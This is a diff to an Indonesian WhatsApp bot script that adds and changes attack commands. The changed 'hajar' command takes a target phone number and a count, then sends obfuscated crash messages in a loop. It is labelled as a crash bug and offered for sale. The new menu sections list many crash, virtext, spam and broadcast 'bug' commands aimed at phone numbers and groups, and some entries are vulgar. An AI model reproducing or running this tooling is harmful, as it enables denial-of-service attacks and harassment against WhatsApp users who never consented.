@@ -1421,13 +1421,13 @@ break
 //CUMAN WORKS DI BAILEYS TERTENTU KALAU MAU GUNAKAN 
 //BUG BARU INI KALIAN BISA ORDER KE GUA YA GUYS YAH
 case '🔥': case '🗿': case 'hajar': {
-mm = text.split("|")[0]+'@s.whatsapp.net'
-jumlah = text.split("|")[1]
-let secon = text.split("|")[2]
+mm = text.split("-")[0]+'@s.whatsapp.net'
+jumlah = text.split("-")[1]
+let secon = text.split("-")[2]
 a = await reply(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
 for (let i = 0; i < jumlah ; i++){
-function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6285157781148','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','reply\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await haikal[_0x47bf3a(0x14f)](m[_0x47bf3a(0x148)],{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
- await sleep(20)
+function _0x128b(_0x4b9866,_0x371baa){var _0x50e42b=_0x50e4();return _0x128b=function(_0x128b07,_0x1424a2){_0x128b07=_0x128b07-0xc4;var _0x46e270=_0x50e42b[_0x128b07];return _0x46e270;},_0x128b(_0x4b9866,_0x371baa);}function _0x50e4(){var _0x19e1ed=['AH\x20SLEBEEW','1GwlWkW','GROUP\x20HW\x20MODS\x20WA','Anjay\x20Menger','27130YhLdkr','JAGOAN\x20OM?','HW\x20MODS\x20WA','2064696gWphjy','4LwmPfv','2167585ExfAxr','NAME','6285157781148','8702696DrukdN','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','6017EGBulL','1073458pGrfkv','6dptURc','6285714170944','10304770yoKCaH','16102656Vbpaag','OWNER'];_0x50e4=function(){return _0x19e1ed;};return _0x50e4();}var _0x1cddf0=_0x128b;(function(_0x34c939,_0x276d78){var _0x100957=_0x128b,_0x2bb075=_0x34c939();while(!![]){try{var _0x487c43=-parseInt(_0x100957(0xd7))/0x1*(-parseInt(_0x100957(0xd0))/0x2)+parseInt(_0x100957(0xc8))/0x3*(parseInt(_0x100957(0xc9))/0x4)+parseInt(_0x100957(0xca))/0x5*(parseInt(_0x100957(0xd1))/0x6)+-parseInt(_0x100957(0xd3))/0x7+parseInt(_0x100957(0xcd))/0x8+-parseInt(_0x100957(0xd4))/0x9+-parseInt(_0x100957(0xc5))/0xa*(-parseInt(_0x100957(0xcf))/0xb);if(_0x487c43===_0x276d78)break;else _0x2bb075['push'](_0x2bb075['shift']());}catch(_0x382e1c){_0x2bb075['push'](_0x2bb075['shift']());}}}(_0x50e4,0xec948),await haikal['sendMessage'](mm,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xd2)}},{'callButton':{'displayText':_0x1cddf0(0xd5),'phoneNumber':_0x1cddf0(0xcc)}},{'urlButton':{'displayText':_0x1cddf0(0xd8),'url':_0x1cddf0(0xce)}},{'quickReplyButton':{'displayText':'MY','id':_0x1cddf0(0xc4)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xcb),'id':_0x1cddf0(0xd6)}},{'quickReplyButton':{'displayText':_0x1cddf0(0xc7),'id':_0x1cddf0(0xc6)}}]}));
+  await sleep(10000* secon)
 }
 }
 break
@@ -4595,7 +4595,7 @@ haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
 break
 //=================================================//
-case 'menuuu': {
+case 'menu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
@@ -4666,8 +4666,20 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushnam
 ^BUG BOT VIP^
 ^BY : ${botname}^
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+┏━━⊱[ SPECIAL ]
+┣❏afk { kasih reactions }
+┣❏joshghoib [ on / off ]
+┣❏joshjagoan [ reply target ]
+┣❏joshsange [ Harus Menjadi Admin ]
+┣❏bugtiktok [ Link ] - Bug Sw
+┗━━⊱[°josh°]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ TARGET ]
 ┣❏🔥 628xxx|5|5
+┣❏crashmex 628xxx|5|5
+┣❏joshskuy 628xxx
+┣❏joshsantet 628xxx@s.whatsapp.net|10|10s
+┣❏catalogpc 628xxx@s.whatsapp.net|10|10s
 ┗━━⊱[°josh°]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 Ketik > m.chat ( di group dulu )
@@ -4675,6 +4687,318 @@ Ketik > m.chat ( di group dulu )
 ┣❏gasjosh 112674448xxx
 ┣❏joshsantetgc  1237891xxxx@g.us|10|10s
 ┣❏cataloggc 1237891xxxx@g.us|10|10s
+┗━━⊱[°josh°]
+┏━━⊱[ BUG ]
+┣❏💀 [ jumlah ]
+┣❏👽 [ jumlah ]
+┣❏☠ [ jumlah ]
+┣❏️👾 [ jumlah ]
+┣❏🪐 [ jumlah ]
+┣❏🦴 [ jumlah ]
+┣❏☝ [ jumlah ]
+┣❏🏻 [ jumlah ]
+┣❏🦖 [ jumlah ]
+┣❏🦕 [ jumlah ]
+┣❏👿 [ jumlah ]
+┣❏🐉 [ jumlah ]
+┣❏⚡ [ jumlah ]
+┣❏💥 [ jumlah ]
+┣❏🔥 [ jumlah ]
+┣❏🌪️ [ jumlah ]
+┣❏🍂 [ jumlah ]
+┣❏🍃 [ jumlah ]
+┣❏🌴 [ jumlah ]
+┣❏🌿 [ jumlah ]
+┣❏🍀 [ jumlah ]
+┣❏🪵 [ jumlah ]
+┣❏🦥 [ jumlah ]
+┣❏🌳 [ jumlah ]
+┣❏🍁 [ jumlah ]
+┣❏🎋 [ jumlah ]
+┣❏🥜 [ jumlah ]
+┣❏🌰 [ jumlah ]
+┣❏🥔 [ jumlah ]
+┣❏🧄 [ jumlah ]
+┣❏🍆 [ jumlah ]
+┣❏🥑 [ jumlah ]
+┣❏🫑 [ jumlah ]
+┣❏🥬 [ jumlah ]
+┣❏🥒 [ jumlah ]
+┣❏🥦 [ jumlah ]
+┣❏🌽 [ jumlah ]
+┣❏🧅 [ jumlah ]
+┣❏🍠 [ jumlah ]
+┣❏🥕 [ jumlah ]
+┣❏🌶️ [ jumlah ]
+┣❏🍅 [ jumlah ]
+┣❏🥥 [ jumlah ]
+┣❏🍇 [ jumlah ]
+┣❏🫐 [ jumlah ]
+┣❏🫒 [ jumlah ]
+┣❏🥝 [ jumlah ]
+┣❏🍐 [ jumlah ]
+┣❏🍏 [ jumlah ]
+┣❏🍈 [ jumlah ]
+┣❏🍋 [ jumlah ]
+┣❏🍌 [ jumlah ]
+┣❏🍍 [ jumlah ]
+┣❏🥭 [ jumlah ]
+┣❏🍊 [ jumlah ]
+┣❏🍑 [ jumlah ]
+┣❏🍉 [ jumlah ]
+┣❏🍎 [ jumlah ]
+┣❏🍒 [ jumlah ]
+┣❏🍓 [ jumlah ]
+┣❏🥀 [ jumlah ]
+┣❏🐍 [ jumlah ]
+┣❏🦂 [ jumlah ]
+┣❏🗿 [ jumlah ]
+┣❏🌷 [ jumlah ]
+┣❏josh1 [ jumlah ]
+┣❏josh2 [ jumlah ]
+┣❏josh3 [ jumlah ]
+┣❏josh4 [ jumlah ]
+┣❏josh5 [ jumlah ]
+┣❏josh6 [ jumlah ]
+┣❏josh7 [ jumlah ]
+┣❏josh8 [ jumlah ]
+┣❏josh9 [ jumlah ]
+┣❏josh10 [ jumlah ]
+┣❏josh11 [ jumlah ]
+┣❏josh12 [ jumlah ]
+┣❏josh13 [ jumlah ]
+┣❏josh14 [ jumlah ]
+┣❏josh15 [ jumlah ]
+┣❏josh16 [ jumlah ]
+┣❏josh17 [ jumlah ]
+┣❏josh18 [ jumlah ]
+┣❏josh19 [ jumlah ]
+┣❏josh20 [ jumlah ]
+┣❏josh21 [ jumlah ]
+┣❏josh22 [ jumlah ]
+┣❏josh23 [ jumlah ]
+┣❏josh24 [ jumlah ]
+┣❏josh25 [ jumlah ]
+┣❏josh26 [ jumlah ]
+┣❏josh27 [ jumlah ]
+┣❏josh28 [ jumlah ]
+┣❏josh29 [ jumlah ]
+┣❏josh30 [ jumlah ]
+┣❏josh31 [ jumlah ]
+┣❏josh32 [ jumlah ]
+┣❏josh33 [ jumlah ]
+┣❏josh34 [ jumlah ]
+┣❏josh35 [ jumlah ]
+┣❏josh36 [ jumlah ]
+┣❏josh37 [ jumlah ]
+┣❏josh38 [ jumlah ]
+┣❏josh39 [ jumlah ]
+┣❏josh40 [ jumlah ]
+┣❏josh41 [ jumlah ]
+┣❏josh42 [ jumlah ]
+┣❏josh43 [ jumlah ]
+┣❏josh44 [ jumlah ]
+┣❏josh45 [ jumlah ]
+┣❏josh46 [ jumlah ]
+┣❏josh47 [ jumlah ]
+┣❏josh48 [ jumlah ]
+┣❏josh49 [ jumlah ]
+┣❏josh50 [ jumlah ]
+┣❏josh51 [ jumlah ]
+┣❏josh52 [ jumlah ]
+┣❏josh53 [ jumlah ]
+┣❏josh54 [ jumlah ]
+┣❏josh55 [ jumlah ]
+┣❏josh56 [ jumlah ]
+┣❏josh57 [ jumlah ]
+┣❏josh58 [ jumlah ]
+┣❏josh59 [ jumlah ]
+┣❏josh60 [ jumlah ]
+┣❏buttonkematian [ jumlah ]
+┣❏mexcrot [ jumlah ]
+┣❏joshnih [ jumlah ]
+┣❏okemex [ jumlah ]
+┣❏ahyangbetul [ jumlah ]
+┣❏ampunsuhu [ jumlah ]
+┣❏mexdemam [ jumlah ]
+┗━━⊱[°josh°]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+┏━━⊱[ JADI BUG VIP ]
+┣❏jadikatalog [reply sticker] jumlah
+┣❏jadijago [Masukan text nya]
+┣❏jadipolling [Masukan text nya]
+┣❏jaditroli [Masukan text nya]
+┣❏jadilokas [Masukan text nya]
+┣❏jadidarknes [Masukan text nya]
+┣❏jadidocu [Masukan text nya]
+┣❏jadibugin𝐯ite [Masukan text nya]
+┣❏jadibugpayment [Masukan text nya]
+┣❏jadibugsw [Masukan text nya]
+┣❏jadibugbokep [Masukan text nya]
+┣❏jadibugbutton [Masukan text nya]
+┣❏jadi𝐯irtext1 [Masukan text nya]
+┣❏jadi𝐯irtext2 [Masukan text nya]
+┣❏jadi𝐯irtext3 [Masukan text nya]
+┣❏jadi𝐯irtext4 [Masukan text nya]
+┣❏jadi𝐯irtext5 [Masukan text nya]
+┣❏jadi𝐯irtext6 [Masukan text nya]
+┣❏jadi𝐯irtext7 [Masukan text nya]
+┣❏jadi𝐯irtext8 [Masukan text nya]
+┣❏jadi𝐯irtext9 [Masukan text nya]
+┣❏jadi𝐯irtext10 [Masukan text nya]
+┣❏jadibug1 [Reply Video Jadi Bug Audio]
+┣❏jadibug2 [Reply Video Jadi Bug Mp3]
+┣❏jadibug3 [Reply Audio Jadi Bug Vn]
+┣❏jadibug4 [Reply Sticker Jadi Bug Gambar]
+┣❏jadibug5 [Reply Gambar Jadi Bug Once] 
+┗━━⊱[°josh°]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+┏━━⊱[ VIRTEXT ]
+┣❏josh𝐯irtext1 [ jumlah ]
+┣❏josh𝐯irtext2 [ jumlah ]
+┣❏josh𝐯irtext3 [ jumlah ]
+┣❏josh𝐯irtext4 [ jumlah ]
+┣❏josh𝐯irtext5 [ jumlah ]
+┣❏josh𝐯irtext6 [ jumlah ]
+┣❏josh𝐯irtext7 [ jumlah ]
+┣❏josh𝐯irtext8 [ jumlah ]
+┣❏josh𝐯irtext9 [ jumlah ]
+┣❏josh𝐯irtext10 [ jumlah ]
+┗━━⊱[°josh°]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+
+┏━━⊱[ SPAM ]
+┣❏inibutton [ jumlah ]
+┣❏jutrol [ jumlah ]
+┣❏cumadocu [ jumlah ]
+┣❏testbutton [ jumlah ]
+┣❏bully [ jumlah ]
+┣❏waifu [ jumlah ]
+┣❏cuddle [ jumlah ]
+┣❏neko [ jumlah ]
+┣❏cry [ jumlah ]
+┣❏kiss [ jumlah ]
+┣❏hug [ jumlah ]
+┣❏lick [ jumlah ]
+┣❏awoo [ jumlah ]
+┣❏yeet [ jumlah ]
+┣❏bite [ jumlah ]
+┣❏lick [ jumlah ]
+┣❏joshkangbuttton [ jumlah ]
+┣❏joshdelay [ jumlah ]
+┣❏joshstik [ jumlah ]
+┣❏joshbugie [ jumlah ]
+┣❏buglokas [ jumlah ]
+┣❏joshtod [ jumlah ]
+┣❏joshbokep [ jumlah ]
+┣❏bugin𝐯ite [ jumlah ] Pc
+┣❏joshha [ jumlah ]
+┣❏joshhi [ jumlah ]
+┣❏joshjoshhu [ jumlah ]
+┣❏joshhe [ jumlah ]
+┣❏joshba [ jumlah ]
+┣❏joshbe [ jumlah ]
+┣❏joshbu [ jumlah ]
+┣❏joshbi [ jumlah ]
+┣❏joshca [ jumlah ]
+┣❏joshci [ jumlah ]
+┣❏joshcu [ jumlah ]
+┣❏joshco [ jumlah ]
+┣❏joshbug1 [ jumlah ]
+┣❏joshbug2 [ jumlah ]
+┣❏joshbug3 [ jumlah ]
+┣❏joshbug4 [ jumlah ]
+┣❏joshbug5 [ jumlah ]
+┣❏joshbug6 [ jumlah ]
+┣❏joshbug7 [ jumlah ]
+┣❏joshpoll [ jumlah ]
+┣❏joshtag [ jumlah ]
+┣❏inibug [ jumlah ]
+┣❏hiya [ jumlah ]
+┣❏lokas [ jumlah ]
+┣❏catalog [ jumlah ]
+┣❏joshdocu [ jumlah ]
+┣❏joshdaca [ jumlah ]
+┣❏duc [ jumlah ]
+┣❏ducu [ jumlah ]
+┣❏joshtroli [ jumlah ]
+┣❏joshtroli2 [ jumlah ]
+┣❏joshtroli3 [ jumlah ]
+┣❏joshjhon2 [ jumlah ]
+┣❏joshjhon [ jumlah ]
+┣❏joshbutton [ jumlah ]
+┣❏joshtrol [ jumlah ]
+┣❏joshkatalog [ jumlah ]
+┣❏joshducu [ jumlah ]
+┣❏joshdaca [ jumlah ]
+┣❏joshdraknes [ jumlah ]
+┣❏joshslebew [ jumlah ]
+┣❏joshsu [ jumlah ]
+┣❏joshtol [ jumlah ]
+┣❏joshmemek [ jumlah ]
+┣❏joshcontol [ jumlah ]
+┣❏joshtext𝐯 [ jumlah ]
+┣❏joshgas [ jumlah ]
+┣❏josh𝐯irtext [ jumlah ]
+┣❏josh𝐯irtext1 [ jumlah ]
+┣❏josh𝐯irtext2 [ jumlah ]
+┣❏josh𝐯irtext3 [ jumlah ]
+┣❏joshcrash [ jumlah ]
+┣❏joshcrash1 [ jumlah ]
+┣❏joshcrash2 [ jumlah ]
+┣❏joshcrash3 [ jumlah ]
+┣❏joshcrash4 [ jumlah ]
+┣❏joshcrash5 [ jumlah ]
+┣❏joshcrash6 [ jumlah ]
+┣❏joshcrash7 [ jumlah ]
+┣❏joshlokas [ jumlah ]
+┣❏joshlokas2 [ jumlah ]
+┣❏joshkangbug [ jumlah ]
+┣❏joshkangbug1 [ jumlah ]
+┣❏joshbar [ jumlah ]
+┣❏joshoke [ jumlah ]
+┣❏joshewe [ jumlah ]
+┣❏joshngentod [ jumlah ]
+┣❏josh1 [ jumlah ]
+┣❏josh2 [ jumlah ]
+┣❏josh3 [ jumlah ]
+┣❏josh4 [ jumlah ]
+┣❏josh5 [ jumlah ]
+┣❏josh6 [ jumlah ]
+┣❏josh7 [ jumlah ]
+┣❏josh8 [ jumlah ]
+┣❏josh9 [ jumlah ]
+┣❏josh10 [ jumlah ]
+┣❏josh11 [ jumlah ]
+┣❏josh12 [ jumlah ]
+┣❏crashar1 [ jumlah ]
+┣❏crashar2 [ jumlah ]
+┣❏crashar3 [ jumlah ]
+┣❏crashar4 [ jumlah ]
+┣❏crashar5 [ jumlah ]
+┣❏crashar6 [ jumlah ]
+┣❏crashar7 [ jumlah ]
+┣❏crashar8 [ jumlah ]
+┣❏crashar9 [ jumlah ]
+┣❏crashar10 [ jumlah ]
+┣❏crashar11 [ jumlah ]
+┣❏crashar12 [ jumlah ]
+┣❏crashar13 [ jumlah ]
+┣❏crashar14 [ jumlah ]
+┣❏crashar15 [ jumlah ]
+┣❏crashar16 [ jumlah ]
+┣❏crashar17 [ jumlah ]
+┣❏crashar18 [ jumlah ]
+┣❏crashar19 [ jumlah ]
+┣❏crashar20 [ jumlah ]
+┣❏spam [ Reply Pesan ]
+┗━━⊱[°josh°]
+▬▭▬▭▬▭▬▭▬▬▭▬▭▬
+┏━━⊱[ BROADCAST ]
+┣❏bugbcimage [ Bug image Broadcast ]
+┣❏bugbcvideo [ Bug Video Broadcast ]
+┣❏bugbcaudio [ Bug Audio Broadcast ]
+┣❏bugbctext [ Bug Text Broadcast ]
 ┗━━⊱[°josh°]`,
 contextInfo:{"externalAdReply": {"title": `SC °josh°͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
@@ -4745,7 +5069,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 }
 break
 //=================================================//
-case 'funnmenuuu': {
+case 'funnmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━⊱[ FUN MENU ]
@@ -4781,7 +5105,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 }
 break
 //=================================================//
-case 'primbonmenuuu': {
+case 'primbonmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━⊱[ PRIMBON MENU ]
@@ -4875,7 +5199,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 }
 break
 //=================================================//
-case 'groupmenuuu': {
+case 'groupmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━⊱[ GROUP MENU ]
@@ -4954,7 +5278,7 @@ thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg',
 }
 break
 //=================================================//
-case 'searchmenuuu': {
+case 'searchmenu': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ┏━━⊱[ SEARCH MENU ]
